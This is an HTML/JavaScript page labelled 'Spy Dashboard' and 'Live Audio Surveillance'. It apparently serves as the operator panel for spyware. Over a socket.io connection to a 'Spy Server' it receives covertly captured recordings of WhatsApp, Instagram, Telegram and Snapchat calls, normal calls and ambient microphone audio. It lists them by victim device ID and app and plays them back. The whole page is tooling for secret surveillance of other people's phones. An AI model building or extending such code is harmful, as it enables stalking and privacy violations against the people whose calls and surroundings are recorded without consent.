<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üïµÔ∏è‚Äç‚ôÇÔ∏è Call Recordings - Spy Dashboard</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="/socket.io/socket.io.js"></script>

    <style>
        :root {
            --bg-color: #1a1a2e;
            --card-color: #16213e;
            --text-color: #e94560;
            --highlight: #0f3460;
            --white: #fff;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--white);
            margin: 0;
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: var(--text-color);
            margin-bottom: 30px;
        }

        /* Tabs Styling */
        .tabs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }

        .tab-btn {
            background-color: var(--card-color);
            border: 1px solid var(--highlight);
            color: white;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
            transition: 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tab-btn:hover, .tab-btn.active {
            background-color: var(--text-color);
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(233, 69, 96, 0.4);
        }

        /* Recording List Styling */
        .recording-container {
            max-width: 800px;
            margin: 0 auto;
        }

        .recording-card {
            background-color: var(--card-color);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            border-left: 5px solid var(--text-color);
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            animation: slideIn 0.4s ease-out;
            transition: transform 0.2s;
        }

        .recording-card:hover {
            transform: translateX(5px);
        }

        .app-icon {
            font-size: 28px;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: rgba(255,255,255,0.05);
            margin-right: 15px;
        }

        /* App Specific Colors */
        .icon-whatsapp { color: #25D366; }
        .icon-instagram { color: #C13584; }
        .icon-telegram { color: #0088cc; }
        .icon-snapchat { color: #FFFC00; text-shadow: 0 0 2px black; }
        .icon-call { color: #34b7f1; }
        .icon-mic { color: #e94560; }

        .info {
            flex-grow: 1;
        }

        .info h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 600;
        }

        .info p {
            margin: 5px 0 0;
            font-size: 12px;
            color: #aaa;
        }

        .info .device-id {
            font-size: 11px;
            color: #666;
            margin-top: 2px;
            display: block;
        }

        audio {
            height: 35px;
            outline: none;
            border-radius: 20px;
            max-width: 250px;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Status Bar */
        #status-msg {
            text-align: center;
            color: #aaa;
            font-size: 14px;
            margin-top: 50px;
        }
    </style>
</head>
<body>

    <h1>üéß Live Audio Surveillance</h1>

    <div class="tabs">
        <button class="tab-btn active" onclick="filterRecordings('all')">All</button>
        <button class="tab-btn" onclick="filterRecordings('WhatsApp')"><i class="fab fa-whatsapp"></i> WhatsApp</button>
        <button class="tab-btn" onclick="filterRecordings('Instagram')"><i class="fab fa-instagram"></i> Instagram</button>
        <button class="tab-btn" onclick="filterRecordings('Telegram')"><i class="fab fa-telegram"></i> Telegram</button>
        <button class="tab-btn" onclick="filterRecordings('Call')"><i class="fas fa-phone"></i> Calls</button>
        <button class="tab-btn" onclick="filterRecordings('Mic')"><i class="fas fa-microphone"></i> Mic</button>
    </div>

    <div class="recording-container" id="recordingList">
        </div>
    
    <div id="status-msg">
        <i class="fas fa-satellite-dish"></i> Waiting for live incoming audio...
    </div>

    <script>
        // ‚úÖ 1. Connect to Server
        const socket = io();
        
        // Array to store data in RAM (Server se aane wala data yahan jama hoga)
        let allRecordings = []; 
        let currentFilter = 'all';

        console.log("üîå Connecting to Spy Server...");

        socket.on('connect', () => {
            console.log("‚úÖ Connected to Server! ID:", socket.id);
            document.getElementById('status-msg').innerHTML = '<i class="fas fa-wifi"></i> Connected. Waiting for data...';
        });

        // ‚úÖ 2. Listen for 'new-audio' event from Server
        // (Server code: io.emit('new-audio', { device_id, url, name }))
        socket.on('new-audio', (data) => {
            console.log("üîä New Audio Received:", data);
            
            // Hide waiting message
            document.getElementById('status-msg').style.display = 'none';

            // Parse Data (Filename se App Name aur Date nikalo)
            const processedData = processAudioData(data);

            // Add to array (Sabse upar)
            allRecordings.unshift(processedData);

            // Refresh UI
            renderList();
        });

        // ‚úÖ 3. Helper: Process Raw Data from Server
        function processAudioData(data) {
            let appName = "Unknown";
            let rawName = data.name.toLowerCase();

            // Filename check karke App Name decide karo
            if (rawName.includes("whatsapp")) appName = "WhatsApp";
            else if (rawName.includes("instagram")) appName = "Instagram";
            else if (rawName.includes("telegram")) appName = "Telegram";
            else if (rawName.includes("snapchat")) appName = "Snapchat";
            else if (rawName.includes("mic") || rawName.includes("ambient")) appName = "Mic"; // Ambient recording
            else appName = "Normal Call";

            // Timestamp (Agar filename me timestamp hai to wahan se lo, nahi to abhi ka time)
            let date = new Date().toLocaleDateString();
            let time = new Date().toLocaleTimeString();

            return {
                device_id: data.device_id,
                app: appName,
                date: date,
                time: time,
                url: data.url
            };
        }

        // ‚úÖ 4. Render Logic (Display List)
        function renderList() {
            const container = document.getElementById('recordingList');
            container.innerHTML = ''; // Clear current list

            // Filter Data
            const filteredData = allRecordings.filter(item => {
                if (currentFilter === 'all') return true;
                if (currentFilter === 'Call') return item.app === "Normal Call";
                return item.app === currentFilter;
            });

            if(filteredData.length === 0) {
                if(allRecordings.length > 0) {
                     container.innerHTML = `<p style="text-align:center; color:#666;">No recordings for ${currentFilter}</p>`;
                }
                return;
            }

            // Create HTML Cards
            filteredData.forEach(rec => {
                const iconClass = getIconClass(rec.app);
                const iconIcon = getIconIcon(rec.app);
                
                const card = `
                    <div class="recording-card">
                        <div class="app-icon ${iconClass}">
                            <i class="${iconIcon}"></i>
                        </div>
                        <div class="info">
                            <h3>${rec.app}</h3>
                            <p>${rec.date} ‚Ä¢ ${rec.time}</p>
                            <span class="device-id">Device: ${rec.device_id}</span>
                        </div>
                        <audio controls controlsList="nodownload">
                            <source src="${rec.url}" type="video/mp4"> <source src="${rec.url}" type="audio/mpeg">
                            Your browser not support audio.
                        </audio>
                    </div>
                `;
                container.innerHTML += card;
            });
        }

        // ‚úÖ 5. Filter Handler
        function filterRecordings(category) {
            currentFilter = category;
            
            // Buttons UI Update
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            event.currentTarget.classList.add('active'); // Use currentTarget specifically for button click
            
            renderList();
        }

        // Helpers for Styling
        function getIconClass(appName) {
            if(appName === 'WhatsApp') return 'icon-whatsapp';
            if(appName === 'Instagram') return 'icon-instagram';
            if(appName === 'Telegram') return 'icon-telegram';
            if(appName === 'Snapchat') return 'icon-snapchat';
            if(appName === 'Mic') return 'icon-mic';
            return 'icon-call';
        }

        function getIconIcon(appName) {
            if(appName === 'WhatsApp') return 'fab fa-whatsapp';
            if(appName === 'Instagram') return 'fab fa-instagram';
            if(appName === 'Telegram') return 'fab fa-telegram';
            if(appName === 'Snapchat') return 'fab fa-snapchat-ghost';
            if(appName === 'Mic') return 'fas fa-microphone-alt';
            return 'fas fa-phone-alt';
        }

    </script>
</body>
</html>
